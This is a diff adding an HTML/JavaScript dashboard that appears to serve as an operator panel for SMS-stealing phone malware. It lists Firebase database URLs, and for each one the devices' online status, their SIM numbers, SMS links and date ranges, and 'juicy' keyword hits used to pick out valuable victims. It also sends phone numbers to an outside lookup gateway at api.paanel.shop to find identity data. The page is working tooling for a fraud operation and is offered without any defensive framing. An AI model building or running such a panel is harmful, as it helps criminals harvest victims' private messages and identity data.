@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Device Monitor Dashboard</title>
+<style>
+  :root {
+    --bg: #0f1117; --bg2: #1a1d27; --bg3: #22263a;
+    --border: #2e3347; --accent: #5e72eb;
+    --green: #22c55e; --red: #ef4444; --yellow: #f59e0b; --gray: #64748b;
+    --text: #e2e8f0; --muted: #94a3b8;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { background: var(--bg); color: var(--text); font-family: 'Segoe UI', sans-serif; font-size: 14px; }
+
+  /* ── Header ── */
+  header { background: var(--bg2); border-bottom: 1px solid var(--border); padding: 12px 20px;
+           display: flex; align-items: center; gap: 12px; position: sticky; top: 0; z-index: 100; }
+  header h1 { font-size: 18px; font-weight: 600; }
+  header .badge { background: var(--accent); color: #fff; border-radius: 12px; padding: 2px 10px; font-size: 12px; }
+  .search-bar { margin-left: auto; display: flex; gap: 8px; }
+  .search-bar input { background: var(--bg3); border: 1px solid var(--border); border-radius: 6px;
+                      color: var(--text); padding: 6px 12px; width: 220px; outline: none; }
+  .search-bar input:focus { border-color: var(--accent); }
+  .btn { background: var(--accent); color: #fff; border: none; border-radius: 6px;
+         padding: 6px 14px; cursor: pointer; font-size: 13px; }
+  .btn:hover { opacity: .85; }
+  .btn-ghost { background: transparent; border: 1px solid var(--border); color: var(--muted); }
+  .btn-ghost:hover { border-color: var(--accent); color: var(--text); }
+
+  /* ── Main layout ── */
+  main { padding: 16px 20px; }
+  #view-urls, #view-devices { display: none; }
+  #view-urls.active, #view-devices.active { display: block; }
+
+  /* ── Stats bar ── */
+  .stats-bar { display: flex; gap: 16px; margin-bottom: 16px; flex-wrap: wrap; }
+  .stat-card { background: var(--bg2); border: 1px solid var(--border); border-radius: 8px;
+               padding: 10px 18px; min-width: 130px; }
+  .stat-card .label { color: var(--muted); font-size: 11px; text-transform: uppercase; letter-spacing: .05em; }
+  .stat-card .value { font-size: 22px; font-weight: 700; margin-top: 2px; }
+
+  /* ── URL grid ── */
+  .url-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(270px, 1fr)); gap: 12px; }
+  .url-card { background: var(--bg2); border: 1px solid var(--border); border-radius: 10px;
+              padding: 14px 16px; cursor: pointer; transition: border-color .15s, transform .1s; }
+  .url-card:hover { border-color: var(--accent); transform: translateY(-2px); }
+  .url-card.has-juicy { border-color: var(--yellow); }
+  .url-card-header { display: flex; align-items: center; gap: 8px; margin-bottom: 10px; }
+  .url-id { font-size: 18px; font-weight: 700; }
+  .url-host { color: var(--muted); font-size: 11px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; flex: 1; }
+  .url-metrics { display: grid; grid-template-columns: 1fr 1fr; gap: 6px; }
+  .metric { background: var(--bg3); border-radius: 6px; padding: 6px 10px; }
+  .metric .k { color: var(--muted); font-size: 10px; }
+  .metric .v { font-weight: 600; font-size: 13px; }
+  .tag-online { color: var(--green); }
+  .tag-offline { color: var(--red); }
+  .tag-juicy { display: inline-block; background: rgba(245,158,11,.15); color: var(--yellow);
+               border-radius: 4px; padding: 1px 6px; font-size: 11px; margin-top: 6px; }
+  .tag-no-data { color: var(--gray); font-style: italic; font-size: 12px; }
+  .sms-dates { font-size: 11px; color: var(--muted); margin-top: 6px; }
+
+  /* ── Devices view ── */
+  .back-btn { display: flex; align-items: center; gap: 6px; color: var(--muted); cursor: pointer;
+              margin-bottom: 14px; font-size: 13px; }
+  .back-btn:hover { color: var(--text); }
+  .url-detail-header { background: var(--bg2); border: 1px solid var(--border); border-radius: 10px;
+                       padding: 14px 18px; margin-bottom: 16px; display: flex; flex-wrap: wrap; gap: 16px; align-items: center; }
+  .url-detail-header h2 { font-size: 16px; }
+  .detail-badges { display: flex; gap: 8px; flex-wrap: wrap; }
+  .badge-sm { border-radius: 6px; padding: 3px 10px; font-size: 12px; font-weight: 600; }
+  .badge-green { background: rgba(34,197,94,.15); color: var(--green); }
+  .badge-red   { background: rgba(239,68,68,.15);  color: var(--red); }
+  .badge-blue  { background: rgba(94,114,235,.15);  color: var(--accent); }
+  .badge-yellow{ background: rgba(245,158,11,.15);  color: var(--yellow); }
+
+  .device-filters { display: flex; gap: 8px; margin-bottom: 12px; flex-wrap: wrap; }
+  .filter-btn { background: var(--bg3); border: 1px solid var(--border); border-radius: 6px;
+                color: var(--muted); padding: 5px 12px; cursor: pointer; font-size: 12px; }
+  .filter-btn.active { border-color: var(--accent); color: var(--text); }
+  .filter-btn:hover { border-color: var(--accent); }
+
+  /* ── Device table ── */
+  .device-table-wrap { overflow-x: auto; }
+  table { width: 100%; border-collapse: collapse; }
+  thead th { background: var(--bg2); border-bottom: 1px solid var(--border); padding: 10px 12px;
+             text-align: left; font-size: 11px; color: var(--muted); text-transform: uppercase; white-space: nowrap; }
+  tbody tr { border-bottom: 1px solid var(--border); }
+  tbody tr:hover { background: var(--bg3); }
+  td { padding: 10px 12px; vertical-align: middle; }
+  .status-dot { display: inline-block; width: 8px; height: 8px; border-radius: 50%; margin-right: 6px; }
+  .dot-online { background: var(--green); box-shadow: 0 0 6px var(--green); }
+  .dot-offline { background: var(--gray); }
+  .sim-link { color: var(--accent); text-decoration: none; }
+  .sim-link:hover { text-decoration: underline; }
+  .kw-tag { display: inline-block; background: rgba(245,158,11,.12); color: var(--yellow);
+            border-radius: 3px; padding: 1px 5px; font-size: 10px; margin: 1px; }
+  .ids-tag { display: inline-block; background: rgba(94,114,235,.12); color: var(--accent);
+             border-radius: 3px; padding: 1px 5px; font-size: 10px; margin: 1px; }
+  .sms-btn { background: var(--bg3); border: 1px solid var(--border); border-radius: 4px;
+             color: var(--muted); padding: 3px 8px; font-size: 11px; text-decoration: none; white-space: nowrap; }
+  .sms-btn:hover { color: var(--text); border-color: var(--accent); }
+  .enriched-info { font-size: 11px; color: var(--muted); }
+  .enriched-info span { color: var(--text); }
+
+  /* ── Loading / empty ── */
+  .loading { text-align: center; padding: 60px; color: var(--muted); }
+  .spinner { display: inline-block; width: 28px; height: 28px; border: 3px solid var(--border);
+             border-top-color: var(--accent); border-radius: 50%; animation: spin .7s linear infinite; margin-bottom: 10px; }
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  /* ── Responsive ── */
+  @media (max-width: 600px) {
+    header { flex-wrap: wrap; } .search-bar { margin-left: 0; width: 100%; }
+    .search-bar input { flex: 1; }
+  }
+</style>
+</head>
+<body>
+<header>
+  <h1>📡 Device Monitor</h1>
+  <span class="badge" id="total-badge">—</span>
+  <div class="search-bar">
+    <input type="text" id="search-input" placeholder="Search URL or host…">
+    <button class="btn btn-ghost" id="refresh-btn" onclick="loadUrls()">↻ Refresh</button>
+  </div>
+</header>
+
+<main>
+  <!-- ── URL list view ── -->
+  <div id="view-urls" class="active">
+    <div class="stats-bar" id="stats-bar"></div>
+    <div class="url-grid" id="url-grid">
+      <div class="loading"><div class="spinner"></div><br>Loading…</div>
+    </div>
+  </div>
+
+  <!-- ── Devices view ── -->
+  <div id="view-devices">
+    <div class="back-btn" onclick="showUrls()">← Back to all URLs</div>
+    <div class="url-detail-header" id="url-detail-header"></div>
+    <div class="device-filters" id="device-filters"></div>
+    <div class="device-table-wrap">
+      <table id="device-table">
+        <thead>
+          <tr>
+            <th>#</th>
+            <th>Status</th>
+            <th>Brand</th>
+            <th>Device ID</th>
+            <th>Battery</th>
+            <th>SIM 1</th>
+            <th>SIM 2</th>
+            <th>Last Activity</th>
+            <th>Juicy</th>
+            <th>IDs Found</th>
+            <th>SMS</th>
+          </tr>
+        </thead>
+        <tbody id="device-tbody"></tbody>
+      </table>
+    </div>
+  </div>
+</main>
+
+<script>
+let allUrls = [];
+let currentDevices = [];
+let activeFilter = 'all';
+
+// ── Load URL list ─────────────────────────────────────────────────────────────
+async function loadUrls() {
+  document.getElementById('url-grid').innerHTML = '<div class="loading"><div class="spinner"></div><br>Loading…</div>';
+  const res = await fetch('/api/urls');
+  allUrls = await res.json();
+  renderUrls(allUrls);
+  renderStats(allUrls);
+}
+
+function renderStats(urls) {
+  const total   = urls.length;
+  const hasData = urls.filter(u => u.total > 0).length;
+  const devices = urls.reduce((s, u) => s + u.total, 0);
+  const online  = urls.reduce((s, u) => s + u.online, 0);
+  const juicy   = urls.reduce((s, u) => s + u.juicyCount, 0);
+
+  document.getElementById('total-badge').textContent = `${total} URLs`;
+  document.getElementById('stats-bar').innerHTML = `
+    <div class="stat-card"><div class="label">URLs with data</div><div class="value">${hasData}</div></div>
+    <div class="stat-card"><div class="label">Total devices</div><div class="value">${devices.toLocaleString()}</div></div>
+    <div class="stat-card"><div class="label">Online now</div><div class="value tag-online">${online}</div></div>
+    <div class="stat-card"><div class="label">Juicy devices</div><div class="value" style="color:var(--yellow)">${juicy}</div></div>
+  `;
+}
+
+function renderUrls(urls) {
+  const q = document.getElementById('search-input').value.toLowerCase();
+  const filtered = q ? urls.filter(u => String(u.id).includes(q) || u.url.toLowerCase().includes(q)) : urls;
+  
+  if (!filtered.length) {
+    document.getElementById('url-grid').innerHTML = '<div class="loading">No results found</div>';
+    return;
+  }
+
+  document.getElementById('url-grid').innerHTML = filtered.map(u => {
+    const host = u.url.replace('https://','').replace('-default-rtdb.firebaseio.com','').replace('/clients','');
+    const hasJuicy = u.juicyCount > 0;
+    const hasData  = u.total > 0;
+    const onlinePct = u.total > 0 ? Math.round(u.online / u.total * 100) : 0;
+    return `
+    <div class="url-card ${hasJuicy?'has-juicy':''}" onclick="openUrl(${u.id})">
+      <div class="url-card-header">
+        <span class="url-id">#${u.id}</span>
+        <span class="url-host" title="${u.url}">${host}</span>
+      </div>
+      ${!hasData ? `<div class="tag-no-data">No cached devices</div>` : `
+      <div class="url-metrics">
+        <div class="metric">
+          <div class="k">Online / Total</div>
+          <div class="v">
+            <span class="tag-online">${u.online}</span>
+            <span style="color:var(--muted)"> / ${u.total}</span>
+            <span style="font-size:10px;color:var(--muted);margin-left:4px">(${onlinePct}%)</span>
+          </div>
+        </div>
+        <div class="metric">
+          <div class="k">Juicy Devices</div>
+          <div class="v" style="color:${hasJuicy?'var(--yellow)':'var(--muted)'}">
+            ${hasJuicy ? `🎯 ${u.juicyCount}` : '—'}
+          </div>
+        </div>
+        <div class="metric">
+          <div class="k">Oldest SMS</div>
+          <div class="v" style="font-size:12px">${u.oldestSms || '—'}</div>
+        </div>
+        <div class="metric">
+          <div class="k">Newest SMS</div>
+          <div class="v" style="font-size:12px">${u.newestSms || '—'}</div>
+        </div>
+      </div>
+      `}
+    </div>`;
+  }).join('');
+}
+
+document.getElementById('search-input').addEventListener('input', () => renderUrls(allUrls));
+
+// ── Open URL devices ──────────────────────────────────────────────────────────
+async function openUrl(id) {
+  document.getElementById('view-urls').classList.remove('active');
+  document.getElementById('view-devices').classList.add('active');
+  document.getElementById('device-tbody').innerHTML = `<tr><td colspan="11"><div class="loading"><div class="spinner"></div><br>Loading devices…</div></td></tr>`;
+
+  const res = await fetch(`/api/url/${id}`);
+  const data = await res.json();
+  currentDevices = data.devices || [];
+  activeFilter = 'all';
+
+  // Header
+  const online  = currentDevices.filter(d => d.status === 'online').length;
+  const offline = currentDevices.length - online;
+  const juicy   = currentDevices.filter(d => d.juicyKeywords.length > 0).length;
+  const sim1    = currentDevices.filter(d => d.sim1Clean).length;
+  const host    = data.url.replace('https://','').replace('-default-rtdb.firebaseio.com','');
+
+  document.getElementById('url-detail-header').innerHTML = `
+    <div>
+      <h2>URL #${data.id} — ${host}</h2>
+      <div style="color:var(--muted);font-size:12px;margin-top:3px">${data.url}</div>
+    </div>
+    <div class="detail-badges">
+      <span class="badge-sm badge-blue">${currentDevices.length} devices</span>
+      <span class="badge-sm badge-green">${online} online</span>
+      <span class="badge-sm badge-red">${offline} offline</span>
+      ${juicy ? `<span class="badge-sm badge-yellow">🎯 ${juicy} juicy</span>` : ''}
+      <span class="badge-sm" style="background:var(--bg3);color:var(--muted)">Schema ${data.schema}</span>
+    </div>
+  `;
+
+  // Filters
+  document.getElementById('device-filters').innerHTML = `
+    <button class="filter-btn active" onclick="setFilter('all',this)">All (${currentDevices.length})</button>
+    <button class="filter-btn" onclick="setFilter('online',this)">🟢 Online (${online})</button>
+    <button class="filter-btn" onclick="setFilter('offline',this)">🔴 Offline (${offline})</button>
+    ${juicy ? `<button class="filter-btn" onclick="setFilter('juicy',this)">🎯 Juicy (${juicy})</button>` : ''}
+    ${sim1 ? `<button class="filter-btn" onclick="setFilter('sim1',this)">📱 Has SIM1 (${sim1})</button>` : ''}
+  `;
+
+  renderDevices();
+}
+
+function setFilter(f, btn) {
+  activeFilter = f;
+  document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
+  btn.classList.add('active');
+  renderDevices();
+}
+
+function renderDevices() {
+  let list = currentDevices;
+  if (activeFilter === 'online')  list = list.filter(d => d.status === 'online');
+  if (activeFilter === 'offline') list = list.filter(d => d.status === 'offline');
+  if (activeFilter === 'juicy')   list = list.filter(d => d.juicyKeywords.length > 0);
+  if (activeFilter === 'sim1')    list = list.filter(d => d.sim1Clean);
+
+  const tbody = document.getElementById('device-tbody');
+  if (!list.length) {
+    tbody.innerHTML = `<tr><td colspan="11" style="text-align:center;padding:40px;color:var(--muted)">No devices match this filter</td></tr>`;
+    return;
+  }
+
+  tbody.innerHTML = list.map((d, i) => {
+    const isOn = d.status === 'online';
+    const sim1Html = d.sim1Clean
+      ? `<a class="sim-link" href="https://api.paanel.shop/api/gateway.php?key=Jack&number=${d.sim1Clean}" target="_blank">${d.sim1}</a>`
+      : `<span style="color:var(--muted)">${d.sim1 !== 'N/A' ? d.sim1 : '—'}</span>`;
+    const sim2Html = d.sim2Clean
+      ? `<a class="sim-link" href="https://api.paanel.shop/api/gateway.php?key=Jack&number=${d.sim2Clean}" target="_blank">${d.sim2}</a>`
+      : `<span style="color:var(--muted)">${d.sim2 !== 'N/A' ? d.sim2 : '—'}</span>`;
+
+    // Enriched IDs
+    const foundIds = [];
+    for (const enriched of [...(d.sim1Enriched||[]), ...(d.sim2Enriched||[])]) {
+      if (enriched.is_valid) foundIds.push(enriched.id);
+    }
+    const idsHtml = foundIds.length
+      ? foundIds.slice(0,3).map(id => `<span class="ids-tag">${id.slice(0,12)}</span>`).join('')
+      : '—';
+
+    const kwHtml = d.juicyKeywords.length
+      ? d.juicyKeywords.map(k => `<span class="kw-tag">${k}</span>`).join('')
+      : '—';
+
+    return `<tr>
+      <td style="color:var(--muted)">${i+1}</td>
+      <td><span class="status-dot ${isOn?'dot-online':'dot-offline'}"></span>${isOn?'Online':'Offline'}</td>
+      <td>${d.brand}</td>
+      <td><code style="font-size:11px;color:var(--muted)">${d.deviceId.slice(0,16)}</code></td>
+      <td>${d.battery}</td>
+      <td>${sim1Html}</td>
+      <td>${sim2Html}</td>
+      <td style="color:var(--muted);font-size:12px">${d.lastActivity}</td>
+      <td>${kwHtml}</td>
+      <td>${idsHtml}</td>
+      <td><a class="sms-btn" href="${d.smsLink}" target="_blank">📥 SMS</a></td>
+    </tr>`;
+  }).join('');
+}
+
+function showUrls() {
+  document.getElementById('view-devices').classList.remove('active');
+  document.getElementById('view-urls').classList.add('active');
+}
+
+// ── Init ──────────────────────────────────────────────────────────────────────
+loadUrls();
+</script>
+</body>
+</html>
